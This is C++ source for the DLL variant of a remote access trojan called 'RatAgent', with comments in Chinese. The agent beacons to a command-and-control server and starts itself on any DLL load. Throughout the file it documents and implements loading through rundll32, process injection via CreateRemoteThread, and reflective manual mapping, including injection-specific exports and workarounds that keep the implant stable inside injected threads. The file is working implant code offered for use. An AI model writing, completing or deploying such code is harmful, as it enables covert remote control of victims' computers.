// agent_dll.cpp — RatAgent 的 DLL 形态
//
// 三种宿主都能用：
//   1) rundll32（导出 Start 阻塞运行，保证进程存活）：
//        rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5
//        rundll32 RatAgent.dll,Stop                ← 另一进程触发跨进程停止事件
//   2) 自己的加载器 / LoadLibrary 宿主（同一进程内启停，可 FreeLibrary 卸载）：
//        LoadLibraryW(L"RatAgent.dll") → GetProcAddress("StartAgent")(args) → ... → StopAgent()
//   3) 注入（CreateRemoteThread + LoadLibrary，或手动映射）：
//        远端线程入口用 StartAgent(const char*)：单指针参数，便于 lpParameter 直接传配置串
//
// 自启动（本 DLL 的默认行为，加载即生效）：
//   有 %LOCALAPPDATA%\RatAgent\autostart.args（或 %TEMP%\RatAgent\ 下同名文件）
//     → 用文件里的参数串启动（优先级最高）；
//   没有该文件
//     → 用内置默认配置启动（beacon 127.0.0.1:8080、轮询 5s），供反射加载/注入这类
//       没有参数通道的场景使用。
//   ⚠ 代价：任何 LoadLibrary 本 DLL 的进程都会起一份 agent；且 DllMain 的自启（延迟
//     300ms）与显式入口（rundll32 的 Start/Stop、宿主 StartAgent）存在竞争——显式入口
//     先到就正常接管，晚到则可能被默认自启抢先（参数被忽略 / Stop 退化为同进程停止）。
//
// 手动映射（reflective load）契约：
//   - 本 DLL 用静态 CRT（/MT），**必须先调用入口点**（DllMainCRTStartup / AddressOfEntryPoint，
//     参数 DLL_PROCESS_ATTACH）让 CRT 完成初始化，否则 std::string/std::mutex 等全局对象未构造；
//   - 不依赖 GetModuleFileName（映射后磁盘上可能没有对应文件）：agent_id/日志默认落在
//     %LOCALAPPDATA%\RatAgent\，可用 id=/log= 覆盖；
//   - 不依赖 TLS（无 thread_local/__declspec(thread)），不依赖 CWD；
//   - 导出函数内不抛异常（异常在手动映射镜像中可能因缺少 .pdata 注册而无法展开）。
#include "agent_runtime.h"

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>

#include <cstdio>
#include <process.h>
#include <string>

namespace
{

    // 取出 "key=value" 形式的参数并从串里删掉（value 到逗号/分号/空格为止）
    std::string extract_kv(std::string& s, const char* key)
    {
        const std::string k = std::string(key) + "=";
        size_t pos = s.find(k);
        if (pos == std::string::npos)
            return std::string();
        size_t end = s.find_first_of(",; \t", pos);
        std::string val = (end == std::string::npos) ? s.substr(pos + k.size())
                                                     : s.substr(pos + k.size(), end - pos - k.size());
        // 连同前导分隔符一起删掉
        size_t start = pos;
        while (start > 0 && (s[start - 1] == ',' || s[start - 1] == ';' || s[start - 1] == ' '))
            --start;
        if (end == std::string::npos)
            s.erase(start);
        else
            s.erase(start, end - start + 1);
        return val;
    }

    void trim(std::string& s)
    {
        while (!s.empty() && (s.back() == ' ' || s.back() == '\t' ||
            s.back() == ',' || s.back() == ';'))
            s.pop_back();
        while (!s.empty() && (s.front() == ' ' || s.front() == '\t' ||
            s.front() == ',' || s.front() == ';'))
            s.erase(s.begin());
    }

    // 无控制台（rundll32 / 注入宿主）时把日志落文件，避免输出丢失
    void redirect_if_needed(const std::string& log_path)
    {
        if (GetConsoleWindow() != nullptr)
            return;
        c2::agent_redirect_stdout(log_path.empty() ? c2::agent_default_log_path() : log_path);
    }

    // DLL 形态的默认参数：beacon→127.0.0.1:8080，轮询 5s，日志落文件
    void fill_dll_defaults(c2::AgentRunArgs& a)
    {
        a.host = "127.0.0.1";
        a.port = 8080;
        a.beacon = true;
        a.sleeptime = 5;
        a.redirect_stdout = true;
        a.id_path = c2::agent_default_id_path(true);   // %LOCALAPPDATA%\RatAgent\agent.id
        a.log_path = c2::agent_default_log_path();
    }

    // 解析参数串并启动（不走 rundll32 的阻塞语义）；返回 0=失败 1=成功
    int start_from_args(const char* args)
    {
        c2::AgentRunArgs a;
        fill_dll_defaults(a);
        std::string err;
        if (args && *args)
        {
            if (!c2::agent_parse_args(args, a, err))
            {
                printf("[!] bad args (%s): %s\n", args, err.c_str());
                return 0;
            }
        }
        if (c2::agent_running())
        {
            printf("[!] already running (mode=%s)\n", c2::agent_mode());
            return 0;
        }
        if (!c2::agent_start(a, err))
        {
            printf("[!] agent_start failed: %s\n", err.c_str());
            return 0;
        }
        return 1;
    }

    // 停止：同进程直接停；否则按 id（hex 或 id 文件路径）推出事件名，跨进程通知
    //   target 支持 "log=<路径>" 与 "id=<路径>" 修饰，以及：
    //     空            → 用默认 id 文件（%LOCALAPPDATA%\RatAgent\agent.id）
    //     32 位 hex     → 直接用它做事件名
    //     其它字符串    → 当作 id 文件路径
    void stop_any(const char* target)
    {
        std::string t = target ? target : "";
        const std::string raw = t;
        // 注意：必须在 t 本身上做提取，提取后 t 才是"裸目标"
        const std::string log_path = extract_kv(t, "log");
        const std::string id_opt = extract_kv(t, "id");
        redirect_if_needed(log_path); // 无控制台时让 Stop 的输出也可见
        printf("[*] Stop requested (target=%s)\n", raw.empty() ? "(default)" : raw.c_str());

        if (c2::agent_running())
        {
            printf("[*] stop (in-process, mode=%s)\n", c2::agent_mode());
            c2::agent_stop(8000);
            printf("[*] in-process stop done (running=%d)\n", c2::agent_running() ? 1 : 0);
            return;
        }

        trim(t);
        bool ok = false;
        if (t.size() == 32)
        {
            ok = c2::agent_signal_stop_by_id_hex(t);
            printf("[*] stop by id hex %s -> %s\n", t.c_str(), ok ? "signalled" : "not found");
        }
        else
        {
            const std::string idf = !t.empty() ? t
                : (!id_opt.empty() ? id_opt : c2::agent_default_id_path(true));
            ok = c2::agent_signal_stop_by_id_file(idf);
            printf("[*] stop by id file %s -> %s\n", idf.c_str(), ok ? "signalled" : "not found");
        }
        if (!ok)
            printf("[!] no running agent matched (target=%s)\n",
                t.empty() ? "(default id file)" : t.c_str());
    }

    // 把参数串解析与启动全部搬到"新建线程"上执行。
    // 原因：CreateRemoteThread 建的线程没有 CRT 的 per-thread 数据，直接在其上跑
    // std::string/vector 等静态 CRT 代码会触发 __fastfail（0xC0000409）。
    // _beginthreadex 会为新线程正确初始化 CRT，之后的重活都在新线程上。
    unsigned __stdcall start_on_new_thread(void* param)
    {
        const char* args = static_cast<const char*>(param);
        start_from_args(args);
        return 0;
    }

    // 加载即自启线程：等 DllMain 走完（脱离 loader lock）后解析参数并启动。
    //   有 autostart.args → 用文件里的参数（优先级最高）
    //   没有             → 用内置默认配置
    // 这里的 300ms 延迟同时是显式入口（rundll32 的 Start/Stop、宿主 StartAgent）能
    // "先接管"的窗口：它们由加载方紧接着调用，通常远早于此；若晚于它，默认自启会先占坑
    //（见文件头与 agent_runtime.h 的说明）。
    unsigned __stdcall autostart_proc(void*)
    {
        Sleep(300);
        std::string args;
        if (c2::agent_autostart_requested(args))
            printf("[*] autostart (trigger) mode=%s\n", c2::agent_version());
        else
        {
            printf("[*] autostart (no trigger -> default config) mode=%s\n", c2::agent_version());
            args.clear();
        }
        start_from_args(args.empty() ? nullptr : args.c_str());
        return 0;
    }

} // namespace

extern "C"
{

    // ---- rundll32 兼容导出（x64 无名字修饰）----
    // rundll32 的入口点签名固定为 void CALLBACK (HWND, HINSTANCE, LPSTR, int)
    __declspec(dllexport) void CALLBACK Start(HWND, HINSTANCE, LPSTR args, int)
    {
        // 先把日志落地（无控制台时），否则下面的 banner 会丢
        std::string a = args ? args : "";
        std::string scan = a;
        redirect_if_needed(extract_kv(scan, "log"));
        printf("[*] RatAgent/%s (rundll32) Start args=%s\n",
            c2::agent_version(), a.empty() ? "(default)" : a.c_str());
        if (!start_from_args(a.c_str()))
            return;
        // 阻塞：rundll32 在入口点返回后会立即结束进程，必须在此驻留
        c2::agent_wait(-1);
        printf("[*] RatAgent stopped, entry point returning\n");
    }

    __declspec(dllexport) void CALLBACK Stop(HWND, HINSTANCE, LPSTR args, int)
    {
        stop_any(args);
    }

    // ---- 供加载器/注入器调用的导出 ----
    // 非阻塞启动：宿主自己保持进程存活（LoadLibrary 宿主或注入线程）
    __declspec(dllexport) int StartAgent(const char* args)
    {
        std::string a = args ? args : "";
        std::string scan = a;
        redirect_if_needed(extract_kv(scan, "log"));
        printf("[*] RatAgent/%s StartAgent args=%s\n",
            c2::agent_version(), a.empty() ? "(default)" : a.c_str());
        return start_from_args(a.c_str());
    }

    __declspec(dllexport) void StopAgent(void)
    {
        stop_any(nullptr);
    }

    // 指定目标停止（32 位 hex agent_id 或 id 文件路径）；同进程内运行时忽略 target
    __declspec(dllexport) int StopAgentEx(const char* target)
    {
        stop_any(target);
        return 1;
    }

    __declspec(dllexport) int AgentRunning(void)
    {
        return c2::agent_running() ? 1 : 0;
    }

    __declspec(dllexport) const char* AgentVersion(void)
    {
        return c2::agent_version();
    }

    __declspec(dllexport) const char* AgentMode(void)
    {
        return c2::agent_mode();
    }

    // ---- 注入专用入口 ----
    // 纯函数探针（不碰 CRT per-thread 数据），用于确认远程调用链路是否可用
    __declspec(dllexport) int WINAPI AgentPing(void)
    {
        return 42;
    }

    // 注入器应调用本入口（CreateRemoteThread 的线程入口）：
    //   lpParameter = 远端内存中的参数串（UTF-8，strdup 由注入器负责）
    // 本函数自身只依赖 CreateThread/_beginthreadex，真正的解析与启动在新线程上完成。
    // 返回 1 表示已派发成功。
    __declspec(dllexport) DWORD WINAPI AgentBootstrap(LPVOID params)
    {
        HANDLE t = (HANDLE)_beginthreadex(nullptr, 0, start_on_new_thread, params, 0, nullptr);
        return t ? 1u : 0u;
    }

} // extern "C"

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        // 加载即自启：有 autostart.args 用文件参数，没有就用内置默认配置
        //（见文件头说明）。这里只起一个线程、不做堆分配，重活交给它在脱离
        // loader lock 之后做。
        HANDLE t = (HANDLE)_beginthreadex(nullptr, 0, autostart_proc, nullptr, 0, nullptr);
        if (t)
            CloseHandle(t);
    }
    else if (reason == DLL_PROCESS_DETACH)
    {
        // loader lock 下不能等待线程（可能死锁）：只置停止标志 + 触发事件
        c2::agent_request_stop();
    }
    return TRUE;
}
